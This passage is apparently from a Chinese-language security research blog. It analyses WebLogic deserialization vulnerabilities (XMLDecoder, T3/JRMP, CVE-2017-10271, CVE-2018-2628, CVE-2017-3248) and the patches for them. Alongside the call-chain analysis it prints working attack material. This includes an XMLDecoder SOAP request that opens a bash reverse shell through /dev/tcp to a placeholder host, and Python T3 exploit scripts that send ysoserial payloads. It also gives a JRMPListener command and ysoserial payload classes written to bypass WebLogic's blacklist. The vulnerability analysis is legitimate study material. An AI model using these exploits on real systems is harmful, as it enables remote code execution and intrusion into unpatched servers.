18);\n        encode(person);\n        Person result = (Person) decode();\n        System.out.println(result);\n        //decode();\n    }\n}\n```\n\n在反序列化的过程中，依据`xml`中文件内容，依据指定类进行反序列化，并且对应属性赋值。那么就可以找一个可以进行`RCE`的类，反序列化过程中就可以进行`RCE`了，相关`POC`如下\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">\n <!--反序列化ProcessBuilder-->\n<object class=\"java.lang.ProcessBuilder\">\n <!--传入参数-->\n <array class=\"java.lang.String\" length=\"1\">\n  <void index=\"0\">\n   <string>calc</string>\n  </void>\n </array>\n <!--调用方法为start-->\n <void method=\"start\" />\n</object>\n</java>\n```\n\n这里`JAVA`版本写啥版本都没什么影响，这个`xml`进行反序列化之后相当于执行代码\n\n```java\nProcessBuilder proc = new ProcessBuilder(\"calc\");\nproc.start();\n```\n\n导致任意代码执行，具体的`XMLDecode`里面怎么反序列化的，怎么调用的，函数调用链是什么样子的，还是看如下参考链接吧\n\nhttps://www.freebuf.com/articles/web/321222.html\n\nhttps://www.freebuf.com/articles/network/247331.html\n\n### T3反序列化\n\n参考：\n\n[WeblogicT3反序列化浅析之cve-2015-4852 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10563#toc-3)\n\n[Weblogic学习（一）： 初识T3反序列化 (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#0af4c320)\n\n其实主要就是`Weblogic`对于`T3`协议的处理，`T3`协议对于`Weblogica`而言，也就相当于`JRMP`协议对于原生的`Java`程序，都是用来`RMI`即远程方法调用的。\n\n#### RMI/JRMP\n\n关于`RMI`以及`JRMP`，感觉下面几篇文章挺好的\n\n[基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7079)\n\n[搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7264#toc-0)\n\n[P神的三篇RMI机制分析](https://wx.zsxq.com/dweb2/index/topic_detail/844112455528482)\n\n就个人理解而言，画个图好解释一下\n\n![image-20230208124253918](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124253918.png)\n\n代码参照的是：[基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7079)\n\n- `Server`相关类实现如下\n\n  ```java\n  public interface HelloService extends Remote {\n    String sayHello() throws RemoteException;\n  }\n  \n  \n  //重写了sayHello\n  public class HelloServiceImpl extends UnicastRemoteObject implements HelloService {\n  \n    protected HelloServiceImpl() throws RemoteException {\n    }\n  \n    @Override\n    public String sayHello() {\n      System.out.println(\"hello!\");\n      return \"hello!\";\n    }\n  }\n  ```\n\n- `Client`相关类实现如下\n\n  ```java\n  public interface HelloService extends Remote {\n  \n    String sayHello() throws RemoteException;\n  }\n  //并没有实现sayHello\n  ```\n\n总结来说，就是`Server`和`Client`共用一个接口，`Client`调用`Server`重写的接口。\n\n首先`Server`重写该接口生成对象，将重写之后的对象进行动态代理序列化后上传到注册中心作为存根`stub`。然后`Client`就可以从注册中心`register`下载`Server`重写该接口的动态代理对象存根`stub`，将之反序列化后进行动态代理即可调用到`Server`重写的接口函数了。\n\n这里提到`stub`对象不是对应的`HelloServiceImpl`对象，而是`JAVA`动态代理对象，里面存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，也就是对于`sayHello`重写的代码并没有保存在这个`stub`对象中，还是保存在服务器上，调用的时候还是远程调用。\n\n还有更加详细的关于动态代理对象的解释可以看看奇安信`A-team`的师傅写的[WebLogic安全研究报告 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704)，感觉写的很好，如下图\n\n![image-20230208124814148](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124814148.png)\n\n需要注意的是，服务端`Server`和注册中心`register`其实是可以放在一台机器上的。\n\n感觉这个过程更像是一个`RSA`过程，服务器生成私钥(`stub`)给客户，公开公钥(`register`以及`Skeleton`)，借助这两方完成通信。\n\n##### 序列化漏洞\n\n在这个过程中进行通信所用到的协议就是`JRMP`协议，其中进行数据传输的过程中，无论是客户端还是服务端，都会用到`JAVA`反序列化和序列化，**盗用一下奇安信师傅的图，2333**\n\n![image-20230208121353125](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208121353125.png)\n\n也就是基本都会存在漏洞，但是爆出来洞之后基本也会有相关的黑名单限制。可以参考：[从ysoserial讲RMI/JRMP反序列化漏洞 - Escape-w - 博客园 (cnblogs.com)](https://www.cnblogs.com/escape-w/p/16107675.html)\n\n\n\n#### T3协议\n\n对于`T3`也是类似的，**盗用一下奇安信师傅的图，2333**\n\n![image-20230208114134211](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208114134211.png)\n\n##### 漏洞原理\n\n而对于使用`T3`协议，其数据包结构\n\n![image-20230208122112606](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208122112606.png)\n\n替换之后，当服务器接收到恶意的数据，对其中的一些序列化数据进行反序列化是，就会导致恶意对象被反序列化，从而引发反序列化漏洞。\n\n##### 攻击方式\n\n相关的攻击方式就比如说在自己服务器生成一个注册中心，可控受害者的反序列化时就可以让其使用`RMI`机制。从自己服务器获取恶意的`stub`对象，然后在受害者再对该`stub`进行反序列化时即可完成攻击。\n\n（因为可控受害者的反序列化的过程中可能会碰到黑名单限制，无法轻松完成`CC`链之类的攻击，所以借助原生`RMI`机制，详见`CVE-2015-4852`之后关于`T3`的漏洞。另外借助原生的`RMI`机制其实也可能会有黑名单限制，这个就需要自己绕过，或者找现成的`payload`来打了，参考：https://www.anquanke.com/post/id/228918）\n\n\n\n\n\n## CVE-2017-10271\n\nWeblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞\n\n### 环境搭建\n\n参考：https://xz.aliyun.com/t/10172#toc-1\n\n记得最后把`docker`重启一下就行\n\n### 漏洞分析\n\n漏洞点在`/wls-wsat/`提供的页面上，当`POST`请求规范的`XML`数据访问该组件下对应的页面，会进入到`weblogic/wsee/jaxws/workcontext/WorkContextServerTube`类中的`processRequest`方法，进行数据包的处理。\n\n相关分析流程可以参考：\n\nhttps://www.anquanke.com/post/id/102768#h2-6\n\nhttps://xz.aliyun.com/t/10172#toc-4\n\n对应调用链条为\n\n```\nWorkContextServerTube.processRequest   \t\t\nWorkContextServerTube.readHeaderOld\t\t\t//这里进行数据提取分割\nWorkContextTube.WorkContextXmlInputAdapter  //这里创建XMLDecoder对象\nWorkContextServerTube.receive\nWorkContextMapImpl.receiveRequest\nWorkContextLocalMap.receiveRequest\nWorkContextEntryImpl.readEntry\nWorkContextXmlInputAdapter.readUTF\n```\n\n最终在`readUTF`中进行反序列化，\n\n![image-20230206192739611](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206192739611.png)\n\n这里的`xmlDecode`里面保存的`buf`就是我们传入去掉头部留下的数据\n\n![image-20230206194257790](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194257790.png)\n\n赋值过来，用`python`跑一下就知道\n\n![image-20230206194334454](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194334454.png)\n\n这样即得到最终的命令执行。\n\n### POC\n\n在`P神`的`vulhub`下复制来的\n\n```\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: 192.168.163.130:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Type: text/xml\nContent-Length: 641\n\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soapenv:Header>\n<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">\n<void class=\"java.lang.ProcessBuilder\">\n<array class=\"java.lang.String\" length=\"3\">\n<void index=\"0\">\n<string>/bin/bash</string>\n</void>\n<void index=\"1\">\n<string>-c</string>\n</void>\n<void index=\"2\">\n<string>\nbash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1</string>\n</void>\n</array>\n<void method=\"start\"/></void>\n</java>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body/>\n</soapenv:Envelope>\n```\n\n### 漏洞修复\n\n官方补丁，没看怎么进行修复，不过应该时添加黑名单\n\n## CVE-2018-2628\n\n详见上面的`T3`反序列化，是`T3`协议的漏洞\n\n### 漏洞探测\n\n首先需要看`Weblogic`是否启用`T3`协议，以及版本号的判断\n\n```\nnmap -p 7001,7002 -T4 -A -v --script weblogic-t3-info 192.168.120.161\n```\n\n### 环境搭建\n\n也是类似的，用`vulhub`的，参考：https://xz.aliyun.com/t/10172#toc-1\n\n记得最后把`docker`重启一下就行\n\n### 漏洞分析\n\n先从最开始的`CVE-2015-4852`进行分析，参考:[Weblogic学习（一）： 初识T3反序列化 (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#CVE-2015-4852)\n\n使用如下`exp`\n\n```python\nfrom os import popen\nimport struct #负责大小端的转换 \nimport subprocess\nfrom sys import stdout\nimport socket\nimport re\nimport binascii\n\ndef generatePayload(gadget,cmd):\n    YSO_PATH = \"/home/hacker/Desktop/WEB/JAVA/ysoserial.jar\"\n    popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)\n    return popen.stdout.read()\n\ndef T3Exploit(ip,port,payload):\n    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    sock.connect((ip,port))\n    handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\"\n    sock.sendall(handshake.encode())\n    data = sock.recv(1024)\n    compile = re.compile(\"HELO:(.*).0.false\")\n    match = compile.findall(data.decode())\n    if match:\n        print(\"Weblogic: \"+\"\".join(match))\n    else:\n        print(\"Not Weblogic\")\n        return  \n    #payload的长度四字节无符号整数\n    payloadLen = binascii.a2b_hex(b\"00000000\")\n\n    #头部某些地方改掉也没关系，估计是只检测了一部分\n    t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\")\n    \n    #反序列化标志，这个不能改\n    desflag = binascii.a2b_hex(b\"fe010000\")\n    \n    payload = payloadLen + t3header  +desflag+  payload\n    payload = struct.pack(\">I\",len(payload)) + payload[4:]\n    sock.send(payload)\nif __name__ == \"__main__\":\n    ip = \"127.0.0.1\"\n    port = 7001\n    gadget = \"CommonsCollections1\"\n    cmd = \"touch /tmp/o_success\"\n    payload = generatePayload(gadget,cmd)\n    T3Exploit(ip,port,payload)\n```\n\n首先断点下在`weblogic.rjvm.InboundMsgAbbrev#readObject`。如下图所示，可以看到前面还有一堆的调用链条\n\n![image-20230208153909798](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208153909798.png)\n\n是相关的异步以及线程、复用器(`muxer`)的分发等知识，不是很懂这里，估计是一些监听检测之类的，可以看看如下的介绍\n\n[CVE-2018-2628 Weblogic反序列化漏洞分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8073#toc-2)\n\n然后看看现在的`weblogic.rjvm.InboundMsgAbbrev#readObject`\n\n![image-20230208160844802](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160844802.png)\n\n这个`var1`就是接收到的数据，看里面的`head`的`buf`属性，将其复制出来，用`python`打印一下看看\n\n![image-20230208160956140](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160956140.png)\n\n可以看到这一大串，其实就是我们的`exp`中的原数据\n\n![image-20230208161130659](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208161130659.png)\n\n前面的`000005f2`就是总的数据包的长度，这些数据都是可控的，但是这个长度只能比实际`payload`短，不能长。\n\n那么之后就是相关解析，进行反序列化了。\n\n#### resolveClass\n\n在上述的`readObject`之后还会进行一系列的函数调用，其中比较重要的点就是`weblogic.rjvm.InboundMsgAbbrev#resolveClass`\n\n![image-20230208163342951](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163342951.png)\n\n传入的`stream`会调用父类`ObjectInputStream`的`resolveClass`来进行类名解析\n\n![image-20230208163240081](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163240081.png)\n\n对于总的`readObject`流程中，`weblogic.rjvm.InboundMsgAbbrev#resolveClass`大致扮演的角色如下廖师傅的图片\n\n![t0158bffbfdfc75d52f](https://pig-007.oss-cn-beijing.aliyuncs.com/img/t0158bffbfdfc75d52f.png)\n\n那么就可以在这里添加一个过滤条件，设置黑名单了，比如如下对于`12.2.1.3`版本的`Weblogic`就会有如下过滤，存在一个检查\n\n![image-20230208163826701](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163826701.png)\n\n而从最开始的该`CVE`相关的`T3`反序列化爆出来之后，后续修复方案大多都是在调用父类`resolveClass`之前进行黑名单过滤，写的代码也是逐次迭代\n\n参考：[weblogic历史T3反序列化漏洞及补丁梳理](https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng)\n\n最开始针对`CVE-2015-4852`的修复是在`resolveClass`中引入了`ClassFilter.isBlackListed`进行过滤，盗用一下`cL0und`师傅的图，23333\n\n![640](https://pig-007.oss-cn-beijing.aliyuncs.com/img/640.png)\n\n后面缝缝补补，黑名单位置也更改在`WebLogicFilterConfig.class`中\n\n![image-20230207203932893](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230207203932893.png)\n\n所以在后续的漏洞中，由于黑名单的使用这里其实需要对`resolveClass`进行一个分析\n\n\n\n\n\n\n\n#### CVE-2017-3248\n\n对于该漏洞的相关的漏洞发展绕过，可以看[weblogic历史T3反序列化漏洞及补丁梳理](https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng)，比较和本次`CVE-2018-2628`漏洞相关的是`CVE-2017-3248`，首次出现使用`JRMPClient`进行外带`RCE`\n\n对应的`exp`如下\n\n```java\nfrom os import popen\nimport struct # 负责大小端的转换 \nimport subprocess\nfrom sys import stdout\nimport socket\nimport re\nimport binascii\n\ndef generatePayload(gadget,cmd):\n    YSO_PATH = \"/home/hacker/Desktop/WEB/JAVA/ysoserial.jar\"\n    popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)\n    return popen.stdout.read()\n\ndef T3Exploit(ip,port,payload):\n    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    sock.connect((ip,port))\n    handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\"\n    sock.sendall(handshake.encode())\n    data = sock.recv(1024)\n    compile = re.compile(\"HELO:(.*).0.false\")\n    match = compile.findall(data.decode())\n    if match:\n        print(\"Weblogic: \"+\"\".join(match))\n    else:\n        print(\"Not Weblogic\")\n        return  \n    #payload的长度四字节无符号整数\n    payloadLen = binascii.a2b_hex(b\"00000000\")\n\n    #头部某些地方改掉也没关系，估计是只检测了一部分\n    t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\")\n    \n    #反序列化标志，这个不能改\n    desflag = binascii.a2b_hex(b\"fe010000\")\n\n    payload = payloadLen + t3header  +desflag+  payload\n    payload = struct.pack(\">I\",len(payload)) + payload[4:]\n    sock.send(payload)\n\nif __name__ == \"__main__\":\n    host = \"127.0.0.1\"\n    port = 7001\n    gadget = \"JRMPClient\"\n    command = \"[JRMPListern_IP]:[JRMPListern_Port]\"\n    payload = generatePayload(gadget, command)\n    T3Exploit(host, port, payload)\n```\n\n可以看到发送的序列化对象是通过`ysoserial`生成的，我们看看`ysoserial`里面具体生成了什么对象\n\n![image-20230208200426758](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208200426758.png)\n\n可以看到生成的是`Registry`对象，然后将之复制出来，放到`IDEA`里面自己测试一下\n\n```java\npackage ysoserial.test.payloads;\n\nimport java.lang.reflect.Proxy;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.ObjID;\nimport java.rmi.server.RemoteObjectInvocationHandler;\nimport java.util.Random;\n\nimport sun.rmi.server.UnicastRef;\nimport sun.rmi.transport.LiveRef;\nimport sun.rmi.transport.tcp.TCPEndpoint;\n\npublic class myTest {\n    public Registry getObject (){\n        String host = \"JRMPLister_IP\";\n        int port = JRMPLister_Port;\n        ObjID id = new ObjID(new Random().nextInt()); // RMI registry\n        TCPEndpoint te = new TCPEndpoint(host, port);\n        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));\n        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);\n        Registry proxy = (Registry) Proxy.newProxyInstance(\n            myTest.class.getClassLoader(),\n            new Class[] {Registry.class},\n            obj);\n        return proxy;\n    }\n\n\n    public static void main ( final String[] args ) throws RemoteException, NotBoundException {\n        myTest test = new myTest();\n        Registry testObj = test.getObject();\n\n        System.out.println(\"test\");\n    }\n}\n\n```\n\n在开启了远程的`JRMPLister_IP`之后\n\n```shell\njava -cp ./ysoserial-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 'touch /tmp/zzzz'\n```\n\n执行上述`JAVA`代码，发现并没有命令执行，远程也没有发送数据的信息显示。那么就可能现在还没有和远程进行通信，那么加入如下可以远程通信的代码\n\n```java\nmyTest test = new myTest();\nRegistry testObj = test.getObject();\ntestObj.list();  //列出可以远程调用的相关对象\nSystem.out.println(\"test\");\n```\n\n发现成功命令执行。\n\n但是这里有个疑问，在`Weblogic`中反序列化对象之后，我并没有找到有对对象调用了远程通信的方法，而在调试的时候发现，当从`resloveClass`中返回，即完成如下代码就会得到命令执行了，这里有点不太懂。为什么能够远程通信了，这些代码里面并没有找到和远程通信的方法调用呀。\n\n![image-20230208201323984](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208201323984.png)\n\n##### 实际调用链\n\n参考:[ysoserial JRMP相关模块分析（二）- payloads/JRMPClient & exploit/JRMPListener - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2650)\n\n[RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT](https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1)\n\n实际调试一下，看看是怎么从`Registry`调用到和远程通信的函数，将`Weblogic`的`jdk`拿出来调试，上述的文章告诉我们最后是在`jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.StreamRemoteCall#executeCall`中获取到远程对象进行反序列化的，如下图所示\n\n![image-20230209153555302](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209153555302.png)\n\n断点下在这里，看一看实际数据，这里的`in`就是连接的数据流\n\n![image-20230209155129824](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155129824.png)\n\n断点之后再运行一下就断在如图所示地方，`ysoserial`会自动生成`BadAttributeValueExpException`这个类对象，然后将恶意的数据封装进去，所以实际的数据中，已经可以看到相关的`CC`链其实已经传过来并且反序列化了\n\n![image-20230209154129644](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209154129644.png)\n\n看看对应的调用栈\n\n![image-20230209155514492](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155514492.png)\n\n有点多，前面大部分都是`RMI`机制相关的调用，不用太管，主要看实际的反序列化的点，即`weblogic.rjvm.InboundMsgAbbrev#readObject`处，那么相关的调用栈就如下\n\n![image-20230209155913075](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155913075.png)\n\n这里可以看到有一堆的`readObject`，这其实涉及到`ObjectInputStream`反序列化的几种方式，参考:[Weblogic CVE-2021-2394 反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/249654)，引用一下上述的一张图，其中红色和蓝色路径是互斥的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/t010c1b879c4be0fecb.png)\n\n那么前面就是针对接口`Registry`的以及`RemoteObjectInvocationHandler`的反序列化，而`RemoteObjectInvocationHandler`是继承自`RemoteObject`，`RemoteObject`又实现了`Serializable`接口，所以走的是下面蓝色的那条路径。\n\n之后在`RemoteObject.readObject`上看一下，对里面的`RemoteObjectInvocationHandler.ref`，即`RemoteRef`进行了反序列化，通过判断`refClassName`，进入的是`else`路径，调用的是其`readExternal`函数，走的是上面红色的那条路，可以看到注释也说明了\n\n![image-20230209163242665](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163242665.png)\n\n这个`ref`在之前的`payload`中看到的是\n\n```java\nUnicastRef ref = new UnicastRef(new LiveRef(id, te, false));\nRemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);\n```\n\n所以反序列化的是`UnicastRef`，其实现了`RemoteRef`接口，`RemoteRef`接口又实现了`Externalizable`接口，所以这里也能知道走的应该是红色路径。然后看看其反序列化函数，即`readExternal`\n\n![image-20230209163615120](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163615120.png)\n\n调用其`read`函数，进行相关`IP/Port`的获取，然后进入到`registerRefs`函数，就是相关的`DGC(Distributed Garbage Collection)`分布式垃圾收集机制，可以参考，可以参考[攻击JavaRMI概述 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/322910.html)。\n\n![image-20230209163831012](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163831012.png)\n\n不是很懂这个，就是进行一些相关注册之后，最后会在`jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.DGCImpl_Stub#dirty`函数中调用到`RemoteRef.invoke`函数\n\n![image-20230209165245896](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209165245896.png)\n\n这里的`ref`就是那个`UnicastRef`了，然后就是这里的`invoke`函数了\n\n![image-20230209175828791](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209175828791.png)\n\n进入`excuteCall`函数，就是之前提到的，那么完整的分析就完成了，在`excuteCall`函数中通过如下代码\n\n```\nvar14 = this.in.readObject();\n```\n\n完成远程对象的反序列化。\n\n#### 绕过CVE-2017-3248\n\n继`CVE-2017-3248`之后，`CVE-2018-2628`生成的原因，就在于绕过了黑名单中对于`java.rmi.registry.Registry`的过滤，该过滤是放在`weblogic.rjvm.InboundMsgAbbrev#resolveProxyClass`中的。\n\n![image-20230208164502309](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208164502309.png)\n\n而这个`resolveProxyClass`在前面那张廖师傅的图片也提到了，也是可以用来过滤的。\n\n原漏洞作者绕过的方法是使用`java.rmi.activation.Activator`进行绕过，参考:[CVE-2018-2628 简单复现与分析](https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA?)，但是实际上，在反序列化时，这个接口根本就没有什么用处，所以随便一个接口都可以绕过，参考:[weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)](https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng)\n\n比如上述`cL0und`师傅说的换成`Map`都可以的，如下代码所示\n\n```java\n//\npackage ysoserial.payloads;\n\nimport java.lang.reflect.Proxy;\nimport java.rmi.server.ObjID;\nimport java.rmi.server.RemoteObjectInvocationHandler;\nimport java.util.Random;\nimport sun.rmi.server.UnicastRef;\nimport sun.rmi.transport.LiveRef;\nimport sun.rmi.transport.tcp.TCPEndpoint;\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.PayloadRunner;\nimport java.util.Map;\n\n@SuppressWarnings ( {\n    \"restriction\"\n} )\n@PayloadTest( harness=\"ysoserial.test.payloads.JRMPReverseConnectSMTest\")\n@Authors({ Authors.MBECHLER })\npublic class JRMPClient3 extends PayloadRunner implements ObjectPayload<Map> {\n\n    public Map getObject ( final String command ) throws Exception {\n\n        String host;\n        int port;\n        int sep = command.indexOf(':');\n        if ( sep < 0 ) {\n            port = new Random().nextInt(65535);\n            host = command;\n        }\n        else {\n            host = command.substring(0, sep);\n            port = Integer.valueOf(command.substring(sep + 1));\n        }\n        ObjID id = new ObjID(new Random().nextInt()); // RMI registry\n        TCPEndpoint te = new TCPEndpoint(host, port);\n        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));\n        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);\n        Map proxy = (Map) Proxy.newProxyInstance(\n            JRMPClient.class.getClassLoader(),\n            new Class[] { Map.class },\n            obj);\n        return proxy;\n    }\n\n\n    public static void main ( final String[] args ) throws Exception {\n        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());\n        PayloadRunner.run(JRMPClient.class, args);\n    }\n}\n```\n\n- `ysoserial`添加`payload`\n\n这里再记录一下在`ysoserial`中添加`payload`。其实`git clone`下来用`IDEA`打开，等待`pom.xml`加载库，然后在`ysoserialsrc/main/java/ysoserial/payloads`中新建对应类放入即可，比如这里就放入`JRMPClient3`就行。最后再用如命令`mvn clean package -DskipTests`打包一下就能用。\n\n接口是什么没有关系，实际上最本质的是`UnicastRef`这个对象就能建立远程连接并且获取信息。比如如下的`JRMPClient2`\n\n```java\npackage ysoserial.payloads;\n\nimport java.rmi.server.ObjID;\nimport java.util.Random;\nimport sun.rmi.server.UnicastRef;\nimport sun.rmi.transport.LiveRef;\nimport sun.rmi.transport.tcp.TCPEndpoint;\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.PayloadRunner;\n\n\n@SuppressWarnings ( {\n    \"restriction\"\n} )\n@PayloadTest( harness=\"ysoserial.test.payloads.JRMPReverseConnectSMTest\")\n@Authors({ Authors.MBECHLER })\npublic class JRMPClient2 extends PayloadRunner implements ObjectPayload<UnicastRef> {\n\n    public UnicastRef getObject ( final String command ) throws Exception {\n\n        String host;\n        int port;\n        int sep = command.indexOf(':');\n        if ( sep < 0 ) {\n            port = new Random().nextInt(65535);\n            host = command;\n        }\n        else {\n            host = command.substring(0, sep);\n            port = Integer.valueOf(command.substring(sep + 1));\n        }\n        ObjID id = new ObjID(new Random().nextInt()); // RMI registry\n        TCPEndpoint te = new TCPEndpoint(host, port);\n        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));\n        return ref;\n    }\n\n\n    public static void main ( final String[] args ) throws Exception {\n        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());\n        PayloadRunner.run(JRMPClient.class, args);\n    }\n}\n\n```\n\n在实际的调用栈如下，也能完成利用。\n\n![image-20230209182117569](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209182117569.png)\n\n此外由于`CVE-2017-3248`的补丁黑名单是添加到`resolveProxyClass`中，而对于`resolveProxyClass`而言，只要反序列化的对象没有`proxy`类的，那么`resolveProxyClass`就不会被调用到，那么其实只用`UnicastRef`的`payload`根本就不会碰到`CVE-2017-3248`的补丁黑名单过滤。\n\n参考:[Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2479)\n\n### 漏洞修复\n\n该`CVE-2018-2628`漏洞的修复最终添加的黑名单是`sun.rmi.server.UnicastRef`，放在`weblogic.utils.io.oif.WebLogicFilterConfig`中。\n\n但是该漏洞的修复并没有用，因为在`UnicastRef`经过`RemoteObjectInvocationHandler`的封装后，其序列化和反序列化过程是在`RemoteObjectInvocationHandler`父类`RemoteObject`的`readObject/writeObject`中完成的\n\n![image-20230209202440301](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209202440301.png)\n\n所以当在`resovleClass`中获取类名尝试拦截时，获取到`RemoteObjectInvocationHandler`之后，下一个是获取不到`UnicastRef`的，因为`UnicastRef`已经在`RemoteObjectInvocationHandler`反序列化过程中完成了反序列化，所以该漏洞的补丁和没加一样的。\n\n参考:[Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2479)\n\n### 疑问\n\n在调试进行序列化和反序列化的时候，我尝试在本地进行，如下代码\n\n```java\npackage ysoserial.test.payloads;\n\nimport java.io.*;\nimport java.lang.reflect.Proxy;\nimport java.rmi.NotBoundException;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.ObjID;\nimport java.rmi.server.RemoteObjectInvocationHandler;\nimport java.util.Random;\n\nimport sun.rmi.server.UnicastRef;\nimport sun.rmi.transport.LiveRef;\nimport sun.rmi.transport.tcp.TCPEndpoint;\n\npublic class myTest {\n    public Registry getObject (){\n        String host = \"123.249.17.65\";\n        int port = 9999;\n        ObjID id = new ObjID(new Random().nextInt()); // RMI registry\n        TCPEndpoint te = new TCPEndpoint(host, port);\n        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));\n        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);\n        Registry proxy = (Registry) Proxy.newProxyInstance(\n            myTest.class.getClassLoader(),\n            new Class[] {Registry.class},\n            obj);\n        return proxy;\n        //return ref;\n    }\n\n\n    public static void main ( final String[] args ) throws IOException, NotBoundException, ClassNotFoundException {\n        myTest test = new myTest();\n        Registry testObj = test.getObject();\n   